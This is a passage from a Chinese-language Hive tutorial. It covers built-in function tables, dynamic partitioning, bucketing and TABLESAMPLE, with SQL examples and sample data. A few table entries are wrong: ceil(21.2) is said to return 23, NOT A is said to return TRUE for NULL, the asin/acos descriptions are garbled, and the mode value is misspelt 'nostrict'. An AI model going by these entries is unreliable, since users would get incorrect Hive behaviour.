B</td><td>布尔值</td><td>A或B正确,或两者同时正确返返回TRUE,否则FALSE。如果A和B值同时为NULL，返回NULL。</td></tr><tr><td>A \</td><td>B</td><td>布尔值</td><td>与”A OR B”相同</td></tr><tr><td>NOT A</td><td>布尔值</td><td>如果A为NULL或错误的时候返回TURE，否则返回FALSE。</td></tr><tr><td>! A</td><td>布尔值</td><td>与”NOT A”相同</td></tr></tbody></table><h5 id="1-4复杂类型函数"><a href="#1-4复杂类型函数" class="headerlink" title="1.4复杂类型函数"></a>1.4复杂类型函数</h5><table><thead><tr><th>函数</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>map</td><td>(key1, value1, key2, value2, …)</td><td>通过指定的键/值对，创建一个map。</td></tr><tr><td>struct</td><td>(val1, val2, val3, …)</td><td>通过指定的字段值，创建一个结构。结构字段名称将COL1，COL2，…</td></tr><tr><td>array</td><td>(val1, val2, …)</td><td>通过指定的元素，创建一个数组。</td></tr></tbody></table><p>1.5对复杂类型函数操作</p><table><thead><tr><th>函数</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>A[n]</td><td>A是一个数组，n为int型</td><td>返回数组A的第n个元素，第一个元素的索引为0。如果A数组为[‘foo’,’bar’]，则A[0]返回’foo’和A[1]返回”bar”。</td></tr><tr><td>M[key]</td><td>M是Map&lt;K, V&gt;，关键K型</td><td>返回关键值对应的值，例如mapM为 {‘f’ -&gt; ‘foo’, ‘b’ -&gt; ‘bar’, ‘all’ -&gt; ‘foobar’}，则M[‘all’] 返回’foobar’。</td></tr><tr><td>S.x</td><td>S为struct</td><td>返回结构x字符串在结构S中的存储位置。如 foobar {int foo, int bar} foobar.foo的领域中存储的整数。</td></tr></tbody></table><h4 id="2-内置函数"><a href="#2-内置函数" class="headerlink" title="2.内置函数"></a>2.内置函数</h4><h5 id="2-1数学函数"><a href="#2-1数学函数" class="headerlink" title="2.1数学函数"></a>2.1数学函数</h5><table><thead><tr><th>返回类型</th><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>BIGINT</td><td>round(double a)</td><td>四舍五入</td></tr><tr><td>DOUBLE</td><td>round(double a, int d)</td><td>小数部分d位之后数字四舍五入，例如round(21.263,2),返回21.26</td></tr><tr><td>BIGINT</td><td>floor(double a)</td><td>对给定数据进行向下舍入最接近的整数。例如floor(21.2),返回21。</td></tr><tr><td>BIGINT</td><td>ceil(double a), ceiling(double a)</td><td>将参数向上舍入为最接近的整数。例如ceil(21.2),返回23.</td></tr><tr><td>double</td><td>rand(), rand(int seed)</td><td>返回大于或等于0且小于1的平均分布随机数（依重新计算而变）</td></tr><tr><td>double</td><td>exp(double a)</td><td>返回e的n次方</td></tr><tr><td>double</td><td>ln(double a)</td><td>返回给定数值的自然对数</td></tr><tr><td>double</td><td>log10(double a)</td><td>返回给定数值的以10为底自然对数</td></tr><tr><td>double</td><td>log2(double a)</td><td>返回给定数值的以2为底自然对数</td></tr><tr><td>double</td><td>log(double base, double a)</td><td>返回给定底数及指数返回自然对数</td></tr><tr><td>double</td><td>pow(double a, double p) power(double a, double p)</td><td>返回某数的乘幂</td></tr><tr><td>double</td><td>sqrt(double a)</td><td>返回数值的平方根</td></tr><tr><td>string</td><td>bin(BIGINT a)</td><td>返回二进制格式</td></tr><tr><td>string</td><td>hex(BIGINT a) hex(string a)</td><td>将整数或字符转换为十六进制格式</td></tr><tr><td>string</td><td>unhex(string a)</td><td>十六进制字符转换由数字表示的字符。</td></tr><tr><td>string</td><td>conv(BIGINT num, int from_base, int to_base)</td><td>将 指定数值，由原来的度量体系转换为指定的试题体系。例如CONV(‘a’,16,2),返回。参考：’1010′ <a href="http://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html#function_conv" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html#function_conv</a></td></tr><tr><td>double</td><td>abs(double a)</td><td>取绝对值</td></tr><tr><td>int double</td><td>pmod(int a, int b) pmod(double a, double b)</td><td>返回a除b的余数的绝对值</td></tr><tr><td>double</td><td>sin(double a)</td><td>返回给定角度的正弦值</td></tr><tr><td>double</td><td>asin(double a)</td><td>返回x的反正弦，即是X。如果X是在-1到1的正弦值，返回NULL。</td></tr><tr><td>double</td><td>cos(double a)</td><td>返回余弦</td></tr><tr><td>double</td><td>acos(double a)</td><td>返回X的反余弦，即余弦是X，，如果-1&lt;= A &lt;= 1，否则返回null.</td></tr><tr><td>int double</td><td>positive(int a) positive(double a)</td><td>返回A的值，例如positive(2)，返回2。</td></tr><tr><td>int double</td><td>negative(int a) negative(double a)</td><td>返回A的相反数，例如negative(2),返回-2。</td></tr></tbody></table><h5 id="2-2收集函数"><a href="#2-2收集函数" class="headerlink" title="2.2收集函数"></a>2.2收集函数</h5><table><thead><tr><th>返回类型</th><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>int</td><td>size(Map&lt;K.V&gt;)</td><td>返回的map类型的元素的数量</td></tr><tr><td>int</td><td>size(Array<t>)</t></td><td>返回数组类型的元素数量</td></tr></tbody></table><h5 id="2-3类型转换函数"><a href="#2-3类型转换函数" class="headerlink" title="2.3类型转换函数"></a>2.3类型转换函数</h5><table><thead><tr><th>返回类型</th><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>指定 “type”</td><td>cast(expr as <type>)</type></td><td>类型转换。例如将字符”1″转换为整数:cast(’1′ as bigint)，如果转换失败返回NULL。</td></tr></tbody></table><h5 id="2-4日期函数"><a href="#2-4日期函数" class="headerlink" title="2.4日期函数"></a>2.4日期函数</h5><table><thead><tr><th>返回类型</th><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>string</td><td>from_unixtime(bigint unixtime[, string format])</td><td>UNIX_TIMESTAMP参数表示返回一个值’YYYY- MM – DD HH：MM：SS’或YYYYMMDDHHMMSS.uuuuuu格式，这取决于是否是在一个字符串或数字语境中使用的功能。该值表示在当前的时区。</td></tr><tr><td>bigint</td><td>unix_timestamp()</td><td>如果不带参数的调用，返回一个Unix时间戳（从’1970- 01 – 0100:00:00′到现在的UTC秒数）为无符号整数。</td></tr><tr><td>bigint</td><td>unix_timestamp(string date)</td><td>指定日期参数调用UNIX_TIMESTAMP（），它返回参数值’1970- 01 – 0100:00:00′到指定日期的秒数。</td></tr><tr><td>bigint</td><td>unix_timestamp(string date, string pattern)</td><td>指定时间输入格式，返回到1970年秒数：unix_timestamp(’2009-03-20′, ‘yyyy-MM-dd’) = 1237532400</td></tr><tr><td>string</td><td>to_date(string timestamp)</td><td>返回时间中的年月日： to_date(“1970-01-01 00:00:00″) = “1970-01-01″</td></tr><tr><td>string</td><td>to_dates(string date)</td><td>给定一个日期date，返回一个天数（0年以来的天数）</td></tr><tr><td>int</td><td>year(string date)</td><td>返回指定时间的年份，范围在1000到9999，或为”零”日期的0。</td></tr><tr><td>int</td><td>month(string date)</td><td>返回指定时间的月份，范围为1至12月，或0一个月的一部分，如’0000-00-00′或’2008-00-00′的日期。</td></tr><tr><td>int</td><td>day(string date) dayofmonth(date)</td><td>返回指定时间的日期</td></tr><tr><td>int</td><td>hour(string date)</td><td>返回指定时间的小时，范围为0到23。</td></tr><tr><td>int</td><td>minute(string date)</td><td>返回指定时间的分钟，范围为0到59。</td></tr><tr><td>int</td><td>second(string date)</td><td>返回指定时间的秒，范围为0到59。</td></tr><tr><td>int</td><td>weekofyear(string date)</td><td>返回指定日期所在一年中的星期号，范围为0到53。</td></tr><tr><td>int</td><td>datediff(string enddate, string startdate)</td><td>两个时间参数的日期之差。</td></tr><tr><td>int</td><td>date_add(string startdate, int days)</td><td>给定时间，在此基础上加上指定的时间段。</td></tr><tr><td>int</td><td>date_sub(string startdate, int days)</td><td>给定时间，在此基础上减去指定的时间段。</td></tr></tbody></table><h5 id="2-5条件函数"><a href="#2-5条件函数" class="headerlink" title="2.5条件函数"></a>2.5条件函数</h5><table><thead><tr><th>返回类型</th><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>T</td><td>if(boolean testCondition, T valueTrue, T valueFalseOrNull)</td><td>判断是否满足条件，如果满足返回一个值，如果不满足则返回另一个值。</td></tr><tr><td>T</td><td>COALESCE(T v1, T v2, …)</td><td>返回一组数据中，第一个不为NULL的值，如果均为NULL,返回NULL。</td></tr><tr><td>T</td><td>CASE a WHEN b THEN c [WHEN d THEN e]* [ELSE f] END</td><td>当a=b时,返回c；当a=d时，返回e，否则返回f。</td></tr><tr><td>T</td><td>CASE WHEN a THEN b [WHEN c THEN d]* [ELSE e] END</td><td>当值为a时返回b,当值为c时返回d。否则返回e。</td></tr></tbody></table><h5 id="2-6字符函数"><a href="#2-6字符函数" class="headerlink" title="2.6字符函数"></a>2.6字符函数</h5><table><thead><tr><th>返回类型</th><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>int</td><td>length(string A)</td><td>返回字符串的长度</td></tr><tr><td>string</td><td>reverse(string A)</td><td>返回倒序字符串</td></tr><tr><td>string</td><td>concat(string A, string B…)</td><td>连接多个字符串，合并为一个字符串，可以接受任意数量的输入字符串</td></tr><tr><td>string</td><td>concat_ws(string SEP, string A, string B…)</td><td>链接多个字符串，字符串之间以指定的分隔符分开。</td></tr><tr><td>string</td><td>substr(string A, int start) substring(string A, int start)</td><td>从文本字符串中指定的起始位置后的字符。</td></tr><tr><td>string</td><td>substr(string A, int start, int len) substring(string A, int start, int len)</td><td>从文本字符串中指定的位置指定长度的字符。</td></tr><tr><td>string</td><td>upper(string A) ucase(string A)</td><td>将文本字符串转换成字母全部大写形式</td></tr><tr><td>string</td><td>lower(string A) lcase(string A)</td><td>将文本字符串转换成字母全部小写形式</td></tr><tr><td>string</td><td>trim(string A)</td><td>删除字符串两端的空格，字符之间的空格保留</td></tr><tr><td>string</td><td>ltrim(string A)</td><td>删除字符串左边的空格，其他的空格保留</td></tr><tr><td>string</td><td>rtrim(string A)</td><td>删除字符串右边的空格，其他的空格保留</td></tr><tr><td>string</td><td>regexp_replace(string A, string B, string C)</td><td>字符串A中的B字符被C字符替代</td></tr><tr><td>string</td><td>regexp_extract(string subject, string pattern, int index)</td><td>通过下标返回正则表达式指定的部分。regexp_extract(‘foothebar’, ‘foo(.*?)(bar)’, 2) returns ‘bar.’</td></tr><tr><td>string</td><td>parse_url(string urlString, string partToExtract [, string keyToExtract])</td><td>返回URL指定的部分。parse_url(‘<a href="http://facebook.com/path1/p.php?k1=v1&amp;k2=v2#Ref1′" target="_blank" rel="noopener">http://facebook.com/path1/p.php?k1=v1&amp;k2=v2#Ref1′</a>, ‘HOST’) 返回：’facebook.com’</td></tr><tr><td>string</td><td>get_json_object(string json_string, string path)</td><td>select a.timestamp, get_json_object(a.appevents, ‘$.eventid’), get_json_object(a.appenvets, ‘$.eventname’) from log a;</td></tr><tr><td>string</td><td>space(int n)</td><td>返回指定数量的空格</td></tr><tr><td>string</td><td>repeat(string str, int n)</td><td>重复N次字符串</td></tr><tr><td>int</td><td>ascii(string str)</td><td>返回字符串中首字符的数字值</td></tr><tr><td>string</td><td>lpad(string str, int len, string pad)</td><td>返回指定长度的字符串，给定字符串长度小于指定长度时，由指定字符从左侧填补。</td></tr><tr><td>string</td><td>rpad(string str, int len, string pad)</td><td>返回指定长度的字符串，给定字符串长度小于指定长度时，由指定字符从右侧填补。</td></tr><tr><td>array</td><td><strong>split(string str, string pat)</strong></td><td>将字符串转换为数组 <code>select split(name, &#39;-&#39;) from psn</code></td></tr><tr><td>int</td><td>find_in_set(string str, string strList)</td><td>返回字符串str第一次在strlist出现的位置。如果任一参数为NULL,返回NULL；如果第一个参数包含逗号，返回0。</td></tr><tr><td>array&lt;array<string>&gt;</string></td><td>sentences(string str, string lang, string locale)</td><td>将字符串中内容按语句分组，每个单词间以逗号分隔，最后返回数组。 例如sentences(‘Hello there! How are you?’) 返回：( (“Hello”, “there”), (“How”, “are”, “you”) )</td></tr><tr><td>array&lt;struct&lt;string,double&gt;&gt;</td><td>ngrams(array&lt;array<string>&gt;, int N, int K, int pf)</string></td><td>SELECT ngrams(sentences(lower(tweet)), 2, 100 [, 1000]) FROM twitter;</td></tr><tr><td>array&lt;struct&lt;string,double&gt;&gt;</td><td>context_ngrams(array&lt;array<string>&gt;, array<string>, int K, int pf)</string></string></td><td>SELECT context_ngrams(sentences(lower(tweet)), array(null,null), 100, [, 1000]) FROM twitter;</td></tr></tbody></table><h4 id="3-内置的聚合函数（UDAF）"><a href="#3-内置的聚合函数（UDAF）" class="headerlink" title="3.内置的聚合函数（UDAF）"></a>3.内置的聚合函数（UDAF）</h4><table><thead><tr><th>返回类型</th><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>bigint</td><td>count(*) , count(expr), count(DISTINCT expr[, expr_., expr_.])</td><td>返回记录条数。</td></tr><tr><td>double</td><td>sum(col), sum(DISTINCT col)</td><td>求和</td></tr><tr><td>double</td><td>avg(col), avg(DISTINCT col)</td><td>求平均值</td></tr><tr><td>double</td><td>min(col)</td><td>返回指定列中最小值</td></tr><tr><td>double</td><td>max(col)</td><td>返回指定列中最大值</td></tr><tr><td>double</td><td>var_pop(col)</td><td>返回指定列的方差</td></tr><tr><td>double</td><td>var_samp(col)</td><td>返回指定列的样本方差</td></tr><tr><td>double</td><td>stddev_pop(col)</td><td>返回指定列的偏差</td></tr><tr><td>double</td><td>stddev_samp(col)</td><td>返回指定列的样本偏差</td></tr><tr><td>double</td><td>covar_pop(col1, col2)</td><td>两列数值协方差</td></tr><tr><td>double</td><td>covar_samp(col1, col2)</td><td>两列数值样本协方差</td></tr><tr><td>double</td><td>corr(col1, col2)</td><td>返回两列数值的相关系数</td></tr><tr><td>double</td><td>percentile(col, p)</td><td>返回数值区域的百分比数值点。0&lt;=P&lt;=1,否则返回NULL,不支持浮点型数值。</td></tr><tr><td>array<double></double></td><td>percentile(col, array(p~1,,\ [, p,,2,,]…))</td><td>返回数值区域的一组百分比值分别对应的数值点。0&lt;=P&lt;=1,否则返回NULL,不支持浮点型数值。</td></tr><tr><td>double</td><td>percentile_approx(col, p[, B])</td><td>Returns an approximate p^th^ percentile of a numeric column (including floating point types) in the group. The B parameter controls approximation accuracy at the cost of memory. Higher values yield better approximations, and the default is 10,000. When the number of distinct values in col is smaller than B, this gives an exact percentile value.</td></tr><tr><td>array<double></double></td><td>percentile_approx(col, array(p~1,, [, p,,2_]…) [, B])</td><td>Same as above, but accepts and returns an array of percentile values instead of a single one.</td></tr><tr><td>array&lt;struct{‘x’,’y’}&gt;</td><td>histogram_numeric(col, b)</td><td>Computes a histogram of a numeric column in the group using b non-uniformly spaced bins. The output is an array of size b of double-valued (x,y) coordinates that represent the bin centers and heights</td></tr><tr><td>array</td><td>collect_set(col)</td><td>返回无重复记录</td></tr></tbody></table><h4 id="4-内置表生成函数（UDTF）"><a href="#4-内置表生成函数（UDTF）" class="headerlink" title="4.内置表生成函数（UDTF）"></a>4.内置表生成函数（UDTF）</h4><table><thead><tr><th>返回类型</th><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>数组</td><td>explode(array<type> a)</type></td><td>数组一条记录中有多个参数，将参数拆分，每个参数生成一列。</td></tr><tr><td></td><td>json_tuple</td><td>get_json_object 语句：select a.timestamp, get_json_object(a.appevents, ‘$.eventid’), get_json_object(a.appenvets, ‘$.eventname’) from log a; json_tuple语句: select a.timestamp, b.* from log a lateral view json_tuple(a.appevent, ‘eventid’, ‘eventname’) b as f1, f2</td></tr></tbody></table><h3 id="Hive动态分区"><a href="#Hive动态分区" class="headerlink" title="Hive动态分区"></a>Hive动态分区</h3><ul><li>hive的静态分区需要用户在插入数据的时候必须手动指定hive的分区字段值，但是这样的话会导致用户的操作复杂度提高，而且在使用的时候会导致数据只能插入到某一个指定分区，无法让数据散列分布，因此更好的方式是当数据在进行插入的时候，根据数据的某一个字段或某几个字段<strong>值</strong>(静态分区必须要知道所有值，而动态分区无需提前知道)动态的将数据插入到不同的目录中，此时引入动态分区</li><li>hive的动态分区配置</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--hive设置hive动态分区开启。默认：true</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.dynamic.partition=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">--hive的动态分区模式。默认：strict（至少有一个分区列是静态分区，为了防止动态产生的分区过多）</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.dynamic.partition.mode=nostrict;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 每一个执行mr节点上，允许创建的动态分区的最大数量(100)</span></span><br><span class="line"><span class="comment">-- set hive.exec.max.dynamic.partitions.pernode;</span></span><br><span class="line"><span class="comment">-- 所有执行mr节点上，允许创建的所有动态分区的最大数量(1000)</span></span><br><span class="line"><span class="comment">-- set hive.exec.max.dynamic.partitions;</span></span><br><span class="line"><span class="comment">-- 所有的mr job允许创建的文件的最大数量(100000)</span></span><br><span class="line"><span class="comment">-- set hive.exec.max.created.files;</span></span><br></pre></td></tr></table></figure><ul><li>语法</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--Hive extension (dynamic partition inserts):</span></span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE <span class="keyword">TABLE</span> tablename <span class="keyword">PARTITION</span> (partcol1[=val1], partcol2[=val2] ...) select_statement <span class="keyword">FROM</span> from_statement;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> tablename <span class="keyword">PARTITION</span> (partcol1[=val1], partcol2[=val2] ...) select_statement <span class="keyword">FROM</span> from_statement;</span><br></pre></td></tr></table></figure><ul><li>案例</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建临时数据库</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> psn_dynamic_part_tmp(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="keyword">string</span>,</span><br><span class="line">    age <span class="built_in">int</span>,</span><br><span class="line">    sex <span class="built_in">int</span>,</span><br><span class="line">    likes <span class="built_in">array</span>&lt;<span class="keyword">string</span>&gt;,</span><br><span class="line">    address <span class="keyword">map</span>&lt;<span class="keyword">string</span>, <span class="keyword">string</span>&gt;</span><br><span class="line">)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span></span><br><span class="line"><span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span></span><br><span class="line">collection items <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'-'</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">keys</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">':'</span></span><br><span class="line">;</span><br><span class="line"><span class="comment">-- 往临时表加载数据</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/home/test/data/psn_dynamic_part'</span> <span class="keyword">into</span> <span class="keyword">table</span> psn_dynamic_part_tmp;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> psn_dynamic_part_tmp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建分区表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> psn_dynamic_part(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="keyword">string</span>,</span><br><span class="line">    likes <span class="built_in">array</span>&lt;<span class="keyword">string</span>&gt;,</span><br><span class="line">    address <span class="keyword">map</span>&lt;<span class="keyword">string</span>, <span class="keyword">string</span>&gt;</span><br><span class="line">)</span><br><span class="line">partitioned <span class="keyword">by</span>(age <span class="built_in">int</span>, sex <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span></span><br><span class="line"><span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span></span><br><span class="line">collection items <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'-'</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">keys</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">':'</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- **插入数据时，此时会产生一个MR任务**</span></span><br><span class="line"><span class="comment">-- 注意select字段的顺序，需要和目标表字段对应，不能select *</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> psn_dynamic_part</span><br><span class="line"><span class="keyword">partition</span> (age,sex)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span>,likes,address,age,sex <span class="keyword">from</span> psn_dynamic_part_tmp</span><br><span class="line">;</span><br><span class="line"><span class="comment">-- 最终会动态根据值创建dfs分区目录，如：/user/hive/warehouse/psn_dynamic_part/age=18|age=.../sex=1|sex=0</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> psn_dynamic_part;</span><br></pre></td></tr></table></figure><ul><li>案例数据(/home/test/data/psn_dynamic_part)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1,smalle,18,1,games-music,addr1:shanghai-add2:beijing</span><br><span class="line">2,test1,20,1,book-music1,addr1:guangzhou-add2:beijing</span><br><span class="line">3,test2,18,0,book-music2,addr1:guangzhou</span><br><span class="line">4,test3,18,0,music3,addr1:guangzhou</span><br><span class="line">5,test4,54,0,music2,addr1:shanghai</span><br><span class="line">6,test5,37,1,book-music2,addr1:shanghai-add2:beijing</span><br><span class="line">7,test6,18,0,book,addr1:shanghai-add2:beijing</span><br><span class="line">8,test7,28,1,book,add1:beijing</span><br></pre></td></tr></table></figure><ul><li>动态分区严格模式下</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 动静分区结合，静态分区需要出现在动态分区字段之前</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> psn_dynamic_part</span><br><span class="line"><span class="keyword">partition</span> (age=<span class="number">18</span>,sex)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span>,likes,address,age,sex</span><br><span class="line"><span class="keyword">from</span> psn_dynamic_part_tmp</span><br><span class="line"><span class="keyword">where</span> age=<span class="number">18</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><h3 id="分桶"><a href="#分桶" class="headerlink" title="分桶"></a>分桶</h3><ul><li>分桶说明<ul><li>Hive分桶表是对列值取hash值得方式，将不同数据放到不同文件中存储</li><li>对于hive中每一个表、分区都可以进一步进行分桶，从而降低每个文件的大小</li><li>由列的hash值除以桶的个数来决定每条数据划分在哪个桶中</li><li>一次作业产生的桶（文件数量）和reduce task个数一致<ul><li>mr运行时会根据bucket的个数自动分配reduce task个数（用户也可以通过mapred.reduce.tasks自己设置reduce任务个数，但分桶时不推荐使用）</li></ul></li></ul></li><li><code>set hive.enforce.bucketing=true;</code> 开启hive分桶支持(v2.3.8可不用设置)</li><li>Hive分桶的抽样查询</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--案例</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> xxx_bucket_table tablesample(bucket <span class="number">1</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="number">4</span> <span class="keyword">on</span> xxx_columns)</span><br><span class="line"><span class="comment">--TABLESAMPLE语法：</span></span><br><span class="line">TABLESAMPLE(BUCKET x <span class="keyword">OUT</span> <span class="keyword">OF</span> y <span class="keyword">ON</span> cols)</span><br><span class="line"><span class="comment">-- x：表示从哪个bucket开始抽取数据，x=1表示从第一个开始提取，当超过bucket文件个数时会报错</span></span><br><span class="line"><span class="comment">-- y：必须为该表总bucket数的倍数或因子。假设bucket文件数为4</span></span><br><span class="line">    <span class="comment">-- 当y=4, 表示从第x个bucket中取4/4=1份数据(即整个x文件的数据)</span></span><br><span class="line">    <span class="comment">-- 当y=8, 表示从第x个bucket中取4/8=0.5份数据(即整个文件的上半部分行数据)</span></span><br><span class="line">    <span class="comment">-- 尽量不要让其除不尽，因此取其倍数或因子</span></span><br></pre></td></tr></table></figure><ul><li>案例</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建临时数据</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> psn_bucket_tmp(<span class="keyword">id</span> <span class="built_in">int</span>, <span class="keyword">name</span> <span class="keyword">string</span>, age <span class="built_in">int</span>) </span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span></span><br><span class="line">;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/home/test/data/psn_bucket'</span> <span class="keyword">into</span> <span class="keyword">table</span> psn_bucket_tmp;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- **创建分桶表**(可和分区表结合使用，也可单独使用)</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> psn_bucket(<span class="keyword">id</span> <span class="built_in">int</span>, <span class="keyword">name</span> <span class="keyword">string</span>, age <span class="built_in">int</span>)</span><br><span class="line">clustered <span class="keyword">by</span> (age) <span class="keyword">into</span> <span class="number">4</span> buckets</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span></span><br><span class="line">;</span><br><span class="line"><span class="comment">-- 插入数据，会启动一个MR任务(Hadoop job information for Stage-1: number of mappers: 1; number of reducers: 4)</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> psn_bucket <span class="keyword">select</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age <span class="keyword">from</span> psn_bucket_tmp;</span><br><span class="line"><span class="comment">-- 会产生4个文件：/user/hive/warehouse/psn_bucket/000000_1|000001_0|000002_0|000003_0</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> psn_bucket; <span class="comment">-- 此时返回的数据id是乱序(8,4,7,3,6,2,5,1)，因为数据是基于hash分散了</span></span><br><span class="line"><span class="comment">-- 抽样，返回7,3</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age <span class="keyword">from</span> psn_bucket tablesample(bucket <span class="number">2</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="number">4</span> <span class="keyword">on</span> age);</span><br></pre></td></tr></table></figure><ul><li>案例测试数据(/home/test/data/psn_bucket)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1,tom,11</span><br><span class="line">2,cat,22</span><br><span class="line">3,dog,33</span><br><span class="line">4,hive,44</span><br><span class="line">5,hbase,55</span><br><span class="line">6,mr,66</span><br><span class="line">7,alice,77</span><br><span class="line">8,scala,88</span><br></pre></td></tr></table></figure><h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><h4 id="Lateral-View"><a href="#Lateral-View" class="headerlink" title="Lateral View"></a>Lateral View</h4><ul><li>Lateral View用于和UDTF函数(如: 